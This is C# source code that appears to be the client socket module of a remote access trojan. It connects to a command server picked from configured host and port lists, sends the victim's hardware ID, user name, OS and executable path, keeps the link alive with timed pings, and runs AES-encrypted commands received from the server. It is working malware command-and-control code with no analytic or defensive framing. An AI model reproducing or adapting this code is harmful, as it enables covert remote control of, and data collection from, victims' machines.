using Client.MessagePack;
using Microsoft.VisualBasic.Devices;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using Client.Handle_Packet;
using Client.Helper;

namespace Client.Sockets
{
    class ClientSocket
    {

        public static Socket Client { get; set; }
        private static byte[] Buffer { get; set; }
        private static long Buffersize { get; set; }
        private static bool BufferRecevied { get; set; }
        private static Timer Tick { get; set; }
        private static MemoryStream MS { get; set; }
        private static object SendSync { get; set; }
        private static object EndSendSync { get; set; }
        public static bool Connected { get; set; }

        public static void InitializeClient()
        {
            try
            {
                Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 50 * 1024,
                    SendBufferSize = 50 * 1024,
                    ReceiveTimeout = -1,
                    SendTimeout = -1,
                };
                Client.Connect(Convert.ToString(Settings.Host.Split(',')[new Random().Next(Settings.Host.Split(',').Length)]),
                    Convert.ToInt32(Settings.Ports.Split(',')[new Random().Next(Settings.Ports.Split(',').Length)]));
                Debug.WriteLine("Connected!");
                Connected = true;
                Buffer = new byte[4];
                BufferRecevied = false;
                MS = new MemoryStream();
                SendSync = new object();
                EndSendSync = new object();
                BeginSend(SendInfo());
                TimerCallback T = CheckServer;
                Tick = new Timer(T, null, new Random().Next(30 * 1000, 60 * 1000), new Random().Next(30 * 1000, 60 * 1000));
                Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
            }
            catch
            {
                Debug.WriteLine("Disconnected!");
                Connected = false;
            }
        }

        public static void Reconnect()
        {

            try
            {
                Tick?.Dispose();
                Client?.Dispose();
                MS?.Dispose();
            }
            finally
            {
                InitializeClient();
            }
        }

        private static byte[] SendInfo()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
            msgpack.ForcePathObject("HWID").AsString = Methods.HWID();
            msgpack.ForcePathObject("User").AsString = Environment.UserName.ToString();
            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString().Replace("Microsoft", null) + " " +
                Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
            msgpack.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
            msgpack.ForcePathObject("Version").AsString = Settings.Version;
            return msgpack.Encode2Bytes();
        }

        public static void ReadServertData(IAsyncResult Iar)
        {
            try
            {
                if (!Client.Connected)
                {
                    Connected = false;
                    return;
                }

                int Recevied = Client.EndReceive(Iar);
                if (Recevied > 0)
                {
                    if (BufferRecevied == false)
                    {
                        MS.Write(Buffer, 0, Recevied);
                        Buffersize = BitConverter.ToInt32(MS.ToArray(), 0);
                        Debug.WriteLine("/// Client Buffersize " + Buffersize.ToString() + " Bytes  ///");
                        MS.Dispose();
                        MS = new MemoryStream();
                        if (Buffersize > 0)
                        {
                            Buffer = new byte[Buffersize];
                            BufferRecevied = true;
                        }
                    }
                    else
                    {
                        MS.Write(Buffer, 0, Recevied);
                        if (MS.Length == Buffersize)
                        {
                            ThreadPool.QueueUserWorkItem(HandlePacket.Read, Settings.aes256.Decrypt(MS.ToArray()));
                            Buffer = new byte[4];
                            MS.Dispose();
                            MS = new MemoryStream();
                            BufferRecevied = false;
                        }
                        else
                            Buffer = new byte[Buffersize - MS.Length];
                    }
                    Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
                }
                else
                {
                    Connected = false;
                    return;
                }
            }
            catch
            {
                Connected = false;
                return;
            }
        }

        public static void BeginSend(byte[] Msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!Client.Connected)
                    {
                        Connected = false;
                        return;
                    }

                    byte[] buffer = Settings.aes256.Encrypt(Msg);
                    byte[] buffersize = BitConverter.GetBytes(buffer.Length);

                    Client.Poll(-1, SelectMode.SelectWrite);
                    Client.BeginSend(buffersize, 0, buffersize.Length, SocketFlags.None, EndSend, null);
                    Client.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, EndSend, null);
                }
                catch
                {
                    Connected = false;
                    return;
                }
            }
        }

        public static void EndSend(IAsyncResult ar)
        {
            lock (EndSendSync)
            {
                try
                {
                    if (!Client.Connected)
                    {
                        Connected = false;
                        return;
                    }

                    int sent = 0;
                    sent = Client.EndSend(ar);
                    Debug.WriteLine("/// Client Sent " + sent.ToString() + " Bytes  ///");
                }
                catch
                {
                    Connected = false;
                    return;
                }
            }
        }

        public static void CheckServer(object obj)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Ping";
            msgpack.ForcePathObject("Message").AsString = DateTime.Now.ToLongTimeString().ToString();
            BeginSend(msgpack.Encode2Bytes());
        }
    }
}
